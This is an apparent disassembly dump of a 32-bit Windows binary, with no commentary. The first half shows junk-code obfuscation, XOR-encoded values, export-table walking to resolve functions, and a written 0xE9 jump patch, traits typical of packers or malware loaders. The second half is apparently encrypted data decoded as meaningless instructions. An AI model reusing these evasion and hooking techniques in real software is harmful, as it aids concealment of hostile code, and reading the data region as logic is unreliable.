  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0x36924425
  4056ec:	sbb    al,0xd3
  4056ee:	pop    edi
  4056ef:	jl     0x40576d
  4056f1:	dec    edx
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	fs aam 0x43
  4056f8:	call   0xf4d5a405
  4056fd:	xchg   ebp,eax
  4056fe:	dec    edx
  4056ff:	(bad)  
  405700:	test   eax,0xde1a9e58
  405705:	cmc    
  405706:	adc    dl,BYTE PTR [eax]
  405708:	daa    
  405709:	imul   esp,DWORD PTR [ebx],0xffffff93
  40570c:	aas    
  40570d:	push   eax
  40570e:	cli    
  40570f:	(bad)  
  405710:	cwde   
  405711:	(bad)  
  405712:	sar    DWORD PTR [eax],cl
  405714:	int3   
  405715:	rol    BYTE PTR [edi-0x3b],0x3a
  405719:	ror    esp,1
  40571b:	cmp    cl,ah
  40571d:	retf   0xbb87
  405720:	stos   BYTE PTR es:[edi],al
  405721:	mov    ebx,eax
  405723:	loop   0x405703
  405725:	xor    eax,0x4cea0bea
  40572a:	jecxz  0x40571a
  40572c:	bound  esp,QWORD PTR [ecx-0x721f76a4]
  405732:	xor    al,BYTE PTR [ecx-0x16]
  405735:	cmp    al,0x86
  405737:	(bad)  
  405738:	lahf   
  405739:	xchg   edx,eax
  40573a:	push   ebx
  40573b:	adc    edx,0x6558f037
  405741:	pop    ds
  405742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405743:	not    ebx
  405745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405746:	pop    esp
  405747:	dec    ebx
  405748:	das    
  405749:	and    DWORD PTR [ebx+eax*4-0x2d0ba14c],ecx
  405750:	pop    ebx
  405751:	retf   
  405752:	jb     0x405704
  405754:	outs   dx,DWORD PTR ds:[esi]
  405755:	lods   eax,DWORD PTR ds:[esi]
  405756:	iret   
  405757:	retf   
  405758:	mov    es,WORD PTR [eax-0x720c0613]
  40575e:	test   eax,0x28aaa04d
  405763:	jge    0x405745
  405765:	les    ebp,FWORD PTR [esi+0xc]
  405768:	xor    eax,0x49bbbd73
  40576d:	push   cs
  40576e:	add    eax,0xfea39bdd
  405773:	(bad)  
  405774:	das    
  405775:	pop    ecx
  405776:	jns    0x4057d8
  405778:	ins    DWORD PTR es:[edi],dx
  405779:	ins    BYTE PTR es:[edi],dx
  40577a:	pushf  
  40577b:	xor    esi,DWORD PTR [ecx]
  40577d:	dec    esp
  40577e:	rcr    BYTE PTR [edx],0x1c
  405781:	rol    ebx,cl
  405783:	push   ss
  405784:	jnp    0x405743
  405786:	mov    dl,0x2
  405788:	mov    esi,0x3feb4842
  40578d:	bound  ebp,QWORD PTR [ebx-0x4ad79b7b]
  405793:	mov    al,ds:0x88822057
  405798:	mov    esi,DWORD PTR [edi-0x61]
  40579b:	jmp    0x405807
  40579d:	scas   eax,DWORD PTR es:[edi]
  40579e:	loop   0x405742
  4057a0:	pop    ecx
  4057a1:	fldcw  WORD PTR [esi-0x70]
  4057a4:	ret    0xc421
  4057a7:	mov    eax,0x2da9e5a8
  4057ac:	int3   
  4057ad:	xor    eax,0x8b4a3166
  4057b2:	and    BYTE PTR [ebx],al
  4057b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b5:	cmp    bl,0xa0
  4057b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b9:	sub    eax,0x5aa8fc36
  4057be:	out    dx,al
  4057bf:	(bad)  
  4057c2:	int3   
  4057c3:	xchg   esi,eax
  4057c4:	cmp    al,0x8a
  4057c6:	push   ds
  4057c7:	mov    al,ds:0xaac53a64
  4057cc:	std    
  4057cd:	rcr    BYTE PTR [bx+si+0x6c7],0x5a
  4057d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d4:	inc    eax
  4057d5:	or     DWORD PTR [esp+ebp*4+0x22674d1e],esi
  4057dc:	push   ebx
  4057dd:	lea    edi,[edx-0x4d461e00]
  4057e3:	fadd   QWORD PTR [ebx+0x6f]
  4057e6:	jg     0x405825
  4057e8:	rcl    esi,1
  4057ea:	or     edi,DWORD PTR [edi]
  4057ec:	retf   0x2ded
  4057ef:	push   ds
  4057f0:	xor    BYTE PTR [ecx+0xb],bh
  4057f3:	ret    
  4057f4:	frstor [edx-0x80]
  4057f7:	add    bh,al
  4057f9:	mov    edx,0xce9d8197
  4057fe:	jle    0x4057fa
  405800:	mov    ch,0x55
  405802:	test   eax,0x430c5635
  405808:	scas   eax,DWORD PTR es:[edi]
  405809:	lds    ebx,FWORD PTR [ecx+ebx*1]
  40580c:	jecxz  0x40587c
  40580e:	lds    ebx,FWORD PTR ds:0xc547384d
  405814:	xchg   esp,eax
  405815:	lock sub eax,0xdf52af6b
  40581b:	jmp    0xbcf4:0xc492c7a1
  405822:	in     al,dx
  405823:	pusha  
  405824:	dec    esp
  405825:	loope  0x40583d
  405827:	push   0x630f5367
  40582c:	cmp    DWORD PTR [ebx],ebx
  40582e:	ins    BYTE PTR es:[edi],dx
  40582f:	les    edi,FWORD PTR [esi-0x2a3e02ee]
  405835:	mov    bl,0xac
  405837:	mov    ah,0x38
  405839:	dec    ecx
  40583a:	or     dh,BYTE PTR [ecx+0x67]
  40583d:	xchg   edx,eax
  40583e:	xchg   ebp,eax
  40583f:	cwde   
  405840:	loopne 0x4057fb
  405842:	fadd   st(1),st
  405844:	ret    
  405845:	gs jg  0x40583d
  405848:	dec    edi
  405849:	mov    BYTE PTR [ebx],al
  40584b:	and    al,0x9f
  40584d:	sub    eax,0xd4e9be73
  405852:	push   ebp
  405853:	xlat   BYTE PTR ds:[ebx]
  405854:	adc    eax,0x59540955
  405859:	xor    BYTE PTR [ebx+0x6af582c],dl
  40585f:	sub    eax,DWORD PTR fs:[edx-0x71a5b5d5]
  405866:	shl    BYTE PTR es:[ebx+0x7e],1
  40586a:	jl     0x4058c4
  40586c:	ret    0xda6b
  40586f:	imul   esi,eax,0xa63b361e
  405875:	xchg   edi,eax
  405876:	pop    ecx
  405877:	test   DWORD PTR [ebx+0x4433f55c],0x13812253
  405881:	xor    DWORD PTR [edi-0x1f],eax
  405884:	in     al,dx
  405885:	int    0xf0
  405887:	je     0x4058c4
  405889:	xchg   DWORD PTR [ebx+eax*1+0x12],ecx
  40588d:	fucomp st(1)
  40588f:	ds dec ecx
  405891:	(bad)  
  405892:	sbb    bl,BYTE PTR [edx-0x238d2457]
  405898:	sbb    eax,0xd2763773
  40589d:	jl     0x40584a
  40589f:	push   ebp
  4058a0:	fwait
  4058a1:	mov    esp,0xb87d95f1
  4058a6:	mov    eax,ds:0x17998f8a
  4058ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058ac:	ret    0x4108
  4058af:	mul    DWORD PTR ss:[esi+0x1f]
  4058b3:	arpl   WORD PTR [esi+0x75],bp
  4058b6:	add    eax,DWORD PTR [ebp-0x3c344098]
  4058bc:	fild   WORD PTR [eax-0x4]
  4058bf:	pop    ecx
  4058c0:	pop    ds
  4058c1:	add    al,0x9a
  4058c3:	iret   
  4058c4:	nop
  4058c5:	cwde   
  4058c6:	scas   al,BYTE PTR es:[edi]
  4058c7:	(bad)  
  4058c8:	into   
  4058c9:	je     0x405893
  4058cb:	cmp    eax,0x2edc3367
  4058d0:	xchg   edx,eax
  4058d1:	mov    al,ds:0x8fc68dc9
  4058d6:	in     eax,0x9f
  4058d8:	ja     0x4058bd
  4058da:	das    
  4058db:	arpl   sp,di
  4058dd:	xchg   ebp,eax
  4058de:	ret    0x899d
  4058e1:	mov    WORD PTR [edx+0x45],?
  4058e4:	push   ecx
  4058e5:	call   0x952334b0
  4058ea:	mov    edx,0xdb2b7b8c
  4058ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f0:	or     edx,ecx
  4058f2:	fwait
  4058f3:	and    cl,BYTE PTR [ebx+0x76]
  4058f6:	jmp    0xb0a36890
  4058fb:	add    BYTE PTR [ecx],al
  4058fd:	sub    al,0xc0
  4058ff:	add    DWORD PTR [eax+0x60],0xffffffb9
  405903:	(bad)  
  405904:	mov    edi,0x46dafd23
  405909:	dec    ecx
  40590a:	cdq    
  40590b:	mov    ds:0x1303110c,eax
  405910:	out    dx,eax
  405911:	inc    esp
  405912:	cmc    
  405913:	test   BYTE PTR [ebp+0x2f],cl
  405916:	push   edi
  405917:	cwde   
  405918:	icebp  
  405919:	inc    esi
  40591a:	mov    edi,0xbfe7c4d6
  40591f:	sbb    eax,0x709abc2f
  405924:	jb     0x4058f6
  405926:	or     BYTE PTR [ebp+0x269ce543],dh
  40592c:	outs   dx,BYTE PTR ds:[esi]
  40592d:	cld    
  40592e:	pop    es
  40592f:	js     0x40590a
  405931:	shr    BYTE PTR [ebx+0x5cac1f8d],0xb7
  405938:	dec    ebp
  405939:	call   0xd274:0x629fa48c
  405940:	daa    
  405941:	outs   dx,BYTE PTR ds:[esi]
  405942:	sub    eax,0x45e27d04
  405947:	add    BYTE PTR [esi+0x10b0eccd],ch
  40594d:	loope  0x40591a
  40594f:	push   edx
  405950:	mov    edi,0xb14926b8
  405955:	mov    cl,0x37
  405957:	popf   
  405958:	out    0x20,al
  40595a:	inc    ebx
  40595b:	jg     0x4058e9
  40595d:	sbb    esi,esp
  40595f:	mov    al,0x3c
  405961:	pop    ds
  405962:	fcom   DWORD PTR [esi]
  405964:	pop    edx
  405965:	scas   eax,DWORD PTR es:[edi]
  405966:	push   0xce72ce9c
  40596b:	push   0xed8037f
  405970:	xchg   ebx,eax
  405971:	repz adc bh,ah
  405974:	mov    dh,0xbb
  405976:	arpl   WORD PTR [ecx-0x4f],ax
  405979:	mov    esi,DWORD PTR [edx-0x10f37ba2]
  40597f:	das    
  405980:	mov    ebx,0x2873aff6
  405985:	push   esp
  405986:	and    DWORD PTR [ecx-0x73],esp
  405989:	or     BYTE PTR [ebp+0x3f],cl
  40598c:	mov    ds:0x341a9ba6,al
  405991:	add    eax,0x3c14a6e2
  405996:	outs   dx,DWORD PTR ds:[esi]
  405997:	mov    DWORD PTR cs:[ecx+0x64f1a5cb],edx
  40599e:	mov    ds:0xd59e76dd,al
  4059a3:	add    DWORD PTR [edi],edx
  4059a5:	ins    DWORD PTR es:[edi],dx
  4059a6:	add    BYTE PTR [eax+0x2e7ae10],bl
  4059ac:	mov    ds,WORD PTR [ecx+0x25]
  4059af:	pop    esp
  4059b0:	xchg   ebp,eax
  4059b1:	inc    edx
  4059b2:	inc    ecx
  4059b3:	inc    ebp
  4059b4:	pop    DWORD PTR [edi]
  4059b6:	jle    0x405983
  4059b8:	(bad)  
  4059b9:	mov    edx,0x388fc4a6
  4059be:	mov    dl,0x4
  4059c0:	add    al,0xf7
  4059c2:	mov    ebx,0x37b13eab
  4059c7:	sub    ah,BYTE PTR [ebx]
  4059c9:	or     ch,BYTE PTR [edi-0x12]
  4059cc:	push   ss
  4059cd:	ret    0xd60e
  4059d0:	add    DWORD PTR [edx+0x2b],ebx
  4059d3:	xor    al,0xda
  4059d5:	mov    eax,0x9681882b
  4059da:	jp     0x4059fd
  4059dc:	lea    eax,[ecx-0x47]
  4059df:	mov    eax,tr1
  4059e2:	(bad)
  4059e5:	cwde   
  4059e6:	mov    esp,0x284e3bc0
  4059eb:	sub    DWORD PTR [edx],eax
  4059ed:	mov    ebx,0x6593db14
  4059f2:	adc    bl,ch
  4059f4:	lods   eax,DWORD PTR ds:[esi]
  4059f5:	jecxz  0x405a2b
  4059f7:	xchg   DWORD PTR [ebp+0x33],edi
  4059fa:	enter  0xcff3,0x4e
  4059fe:	sahf   
  4059ff:	jmp    0x53e733
  405a04:	push   ebx
  405a05:	nop
  405a06:	mov    al,ds:0x878b17a1
  405a0b:	aam    0xc0
  405a0d:	rcr    DWORD PTR [ebx-0x3a],1
  405a10:	cdq    
  405a11:	fsubr  st(7),st
  405a13:	pushf  
  405a14:	jmp    0xc713:0xb71bac19
  405a1b:	out    dx,eax
  405a1c:	call   0xa09aa274
  405a21:	scas   al,BYTE PTR es:[edi]
  405a22:	cld    
  405a23:	imul   esi,DWORD PTR [ecx-0x38],0x13
  405a27:	stos   BYTE PTR es:[edi],al
  405a28:	push   eax
  405a29:	or     eax,0x3a28ebfa
  405a2e:	stos   BYTE PTR es:[edi],al
  405a2f:	int    0x30
  405a31:	les    esi,FWORD PTR [edi+0x1271de21]
  405a37:	aas    
  405a38:	iret   
  405a39:	inc    ebp
  405a3a:	iret   
  405a3b:	fimul  DWORD PTR [edi+0x74]
  405a3e:	sub    DWORD PTR gs:[ebx],ebp
  405a41:	add    bh,BYTE PTR [esi-0x48]
  405a44:	and    edx,edi
  405a46:	cmp    ecx,DWORD PTR [ebx+ebx*2+0x5b]
  405a4a:	xchg   esp,eax
  405a4b:	push   ebx
  405a4c:	pop    edx
  405a4d:	aaa    
  405a4e:	cmp    al,ah
  405a50:	xchg   esi,eax
  405a51:	inc    eax
  405a52:	out    dx,al
  405a53:	ror    BYTE PTR [edi+0xb],1
  405a56:	inc    esi
  405a57:	jo     0x405a74
  405a59:	ss call 0xe99e43ae
  405a5f:	das    
  405a60:	mov    dl,0xb
  405a62:	std    
  405a63:	scas   al,BYTE PTR es:[edi]
  405a64:	add    BYTE PTR [edi+ecx*4+0x1cf7d148],al
  405a6b:	aad    0xeb
  405a6d:	sbb    dh,0xdf
  405a70:	sbb    eax,edx
  405a72:	sub    BYTE PTR [ecx-0x31],ah
  405a75:	mov    ?,WORD PTR [ecx]
